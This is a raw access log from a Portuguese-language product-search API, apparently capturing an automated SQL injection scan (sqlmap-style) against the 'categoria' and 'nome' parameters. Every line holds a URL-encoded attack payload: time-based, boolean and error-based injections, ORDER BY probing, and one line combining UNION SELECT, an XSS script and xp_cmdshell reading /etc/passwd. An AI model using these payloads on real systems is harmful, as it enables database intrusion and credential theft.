api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2865%29%7C%7CCHR%28115%29%7C%7CCHR%28114%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2865%29%7C%7CCHR%28115%29%7C%7CCHR%28114%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2865%29%7C%7CCHR%28115%29%7C%7CCHR%28114%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2865%29%7C%7CCHR%28115%29%7C%7CCHR%28114%29%7C%7CCHR%2899%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7969%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29zgUt%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dkKP%27%3D%27dkKP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7969%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29zgUt%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vrxS%27%3D%27vrxS HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7969%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29zgUt%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283589%3D3589 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7969%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29zgUt%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7969%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29zgUt%29--%2F%2A%2A%2FyEck HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4527%3D%28SELECT%2F%2A%2A%2F4527%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27VBMv%27%3D%27VBMv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4527%3D%28SELECT%2F%2A%2A%2F4527%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27kRpd%27%3D%27kRpd HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4527%3D%28SELECT%2F%2A%2A%2F4527%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281001%3D1001 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4527%3D%28SELECT%2F%2A%2A%2F4527%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4527%3D%28SELECT%2F%2A%2A%2F4527%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FubHF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27XFxH%27%3D%27XFxH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27NvkB%27%3D%27NvkB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%281820%3D1820 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FXzfc HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1033%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%28120%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27tKyP%27%3D%27tKyP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1033%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%28120%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27reBF%27%3D%27reBF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1033%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%28120%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283283%3D3283 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1033%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%28120%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1033%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%28120%29%7C%7CCHR%28114%29%7C%7CCHR%28116%29%2C5%29--%2F%2A%2A%2FEKhx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FWSVF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7001--%2F%2A%2A%2FFsRE HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FGPXr HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3053--%2F%2A%2A%2FVrnn HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FFTBn HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4852--%2F%2A%2A%2FkLAJ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FXZXA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5976--%2F%2A%2A%2FQAyG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FPeep HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2967--%2F%2A%2A%2FXkfQ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos&gEXS=4039%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=4173&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%29%29%29%28%27%22.%29%28&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27Hpzvob%3C%27%22%3EupsqUH&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8207%3D8298%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27vuLx%27%3D%27vuLx&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8993%3D3671%2F%2A%2A%2FAND%2F%2A%2A%2F%27daWb%27%3D%27daWb&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6735%3D4952%2F%2A%2A%2FAND%2F%2A%2A%2F%287168%3D7168&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1074%3D5330&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2134%3D9396--%2F%2A%2A%2FRGih&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284960%3D6212%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6212%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3598%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%287104%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%2F%2A%2A%2F%28ELT%287104%3D7104%2C1%29%29%29%2C0x71787a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qrtR%27%3D%27qrtR&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%287104%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%2F%2A%2A%2F%28ELT%287104%3D7104%2C1%29%29%29%2C0x71787a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27mULt%27%3D%27mULt&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%287104%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%2F%2A%2A%2F%28ELT%287104%3D7104%2C1%29%29%29%2C0x71787a7871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289249%3D9249&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%287104%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%2F%2A%2A%2F%28ELT%287104%3D7104%2C1%29%29%29%2C0x71787a7871%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%287104%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%2F%2A%2A%2F%28ELT%287104%3D7104%2C1%29%29%29%2C0x71787a7871%29%29--%2F%2A%2A%2FLboa&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6978%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286978%3D6978%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qwZP%27%3D%27qwZP&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6978%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286978%3D6978%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Nisp%27%3D%27Nisp&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6978%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286978%3D6978%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288404%3D8404&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6978%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286978%3D6978%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6978%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286978%3D6978%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FgAyi&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5523%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285523%3D5523%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qRcX%27%3D%27qRcX&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5523%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285523%3D5523%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WKKQ%27%3D%27WKKQ&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5523%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285523%3D5523%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288721%3D8721&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5523%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285523%3D5523%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5523%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285523%3D5523%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FnRwF&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6225%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286225%3D6225%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27zeRl%27%3D%27zeRl&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6225%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286225%3D6225%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27BFYB%27%3D%27BFYB&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6225%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286225%3D6225%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283811%3D3811&categoria=eletronicos HTTP/1.1
